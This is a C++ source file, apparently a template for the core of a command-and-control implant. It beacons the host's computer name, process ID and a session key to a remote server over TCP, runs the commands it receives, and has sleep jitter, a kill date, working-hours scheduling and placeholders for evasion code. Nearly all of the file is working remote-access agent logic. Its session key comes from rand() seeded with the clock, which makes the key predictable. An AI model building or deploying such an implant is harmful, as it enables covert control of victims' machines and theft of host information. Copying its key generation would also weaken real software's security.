// __NAME__ Agent — Agent Implementation
//
// Lifecycle: construct → Run(profile) → loop(exchange, dispatch, sleep) → exit.

#include "Agent.h"
#include "Commander.h"
#include "ConnectorTCP.h"
#include "JobsController.h"
#include "Downloader.h"
// __EVASION_INCLUDE__

#include <stdint.h>
#include <string.h>
#include <stdlib.h>   // rand, srand
#include <time.h>     // time

typedef struct {
    uint32_t pid;
    BYTE     sessionKey[16];
    char     computerName[MAX_COMPUTERNAME_LENGTH + 1];
} BasicBeat;

Agent::Agent()
{
    srand((unsigned int)time(nullptr));

    commander  = new Commander(this);
    connector  = new ConnectorTCP();
    jobs       = new JobsController();
    downloader = new Downloader();

    // Generate random session key (16 bytes)
    sessionKey = (BYTE*)LocalAlloc(LPTR, 16);
    if (sessionKey) {
        for (int i = 0; i < 16; ++i) {
            sessionKey[i] = (BYTE)(rand() & 0xFF);
        }
    }

    // __EVASION_CTOR__
}

Agent::~Agent()
{
    if (commander)  { delete commander;  commander  = nullptr; }
    if (connector)  { delete connector;  connector  = nullptr; }
    if (jobs)       { delete jobs;       jobs       = nullptr; }
    if (downloader) { delete downloader; downloader = nullptr; }
    if (sessionKey) { LocalFree(sessionKey); sessionKey = nullptr; }
}

void Agent::Run(void* profile, ULONG profileSize)
{
    (void)profileSize;

    if (!connector || !commander || !jobs) {
        return;
    }

    if (!connector->SetProfile(profile, nullptr, 0)) {
        return;
    }

    while (active && !ShouldExit()) {
        WaitForWorkingHours();

        ULONG beatSize = 0;
        BYTE* beat = BuildBeat(&beatSize);
        connector->Exchange(beat, beatSize, sessionKey);
        if (beat) {
            LocalFree(beat);
        }

        if (connector->RecvSize() > 0 && connector->RecvData()) {
            commander->ProcessCommandTasks(connector->RecvData(), (ULONG)connector->RecvSize(), nullptr, nullptr);
        }
        connector->RecvClear();

        jobs->Reap();
        connector->Sleep(sleepMs, jitter);
    }

    connector->CloseConnector();
}

BOOL Agent::IsActive()
{
    return active;
}

BYTE* Agent::BuildBeat(ULONG* size)
{
    if (!size) {
        return nullptr;
    }

    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD computerLen = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computerName, &computerLen);

    DWORD pid = GetCurrentProcessId();
    ULONG totalSize = (ULONG)sizeof(BasicBeat);

    BYTE* beat = (BYTE*)LocalAlloc(LPTR, totalSize);
    if (!beat) {
        *size = 0;
        return nullptr;
    }

    BasicBeat* payload = (BasicBeat*)beat;
    payload->pid = (uint32_t)pid;

    if (sessionKey) {
        memcpy(payload->sessionKey, sessionKey, 16);
    }

    if (computerLen > 0) {
        memcpy(payload->computerName, computerName, computerLen);
    }

    *size = totalSize;
    return beat;
}

// ── Trivial utility methods ────────────────────────────────────────────────────

void Agent::SleepWithJitter()
{
    ULONG ms = sleepMs;
    if (jitter > 0 && jitter <= 90) {
        int pct  = (int)(rand() % (jitter * 2 + 1)) - (int)jitter;
        int adj  = (int)ms * pct / 100;
        int total = (int)ms + adj;
        if (total < 0) total = 0;
        ms = (ULONG)total;
    }
    Sleep(ms);
}

BOOL Agent::ShouldExit()
{
    if (killDate <= 0) return FALSE;
    INT64 now = (INT64)time(nullptr);
    return now >= killDate;
}

void Agent::WaitForWorkingHours()
{
    if (workStart == 0 && workEnd == 0) return;

    while (TRUE) {
        time_t rawtime;
        time(&rawtime);
        struct tm* lt = localtime(&rawtime);
        int hhmm = lt->tm_hour * 100 + lt->tm_min;

        BOOL inWindow;
        if (workStart <= workEnd) {
            // daytime window: e.g. 0900-1700
            inWindow = (hhmm >= workStart && hhmm < workEnd);
        } else {
            // overnight window: e.g. 2200-0600
            inWindow = (hhmm >= workStart || hhmm < workEnd);
        }
        if (inWindow) break;

        Sleep(60000); // retry every 60 seconds
    }
}
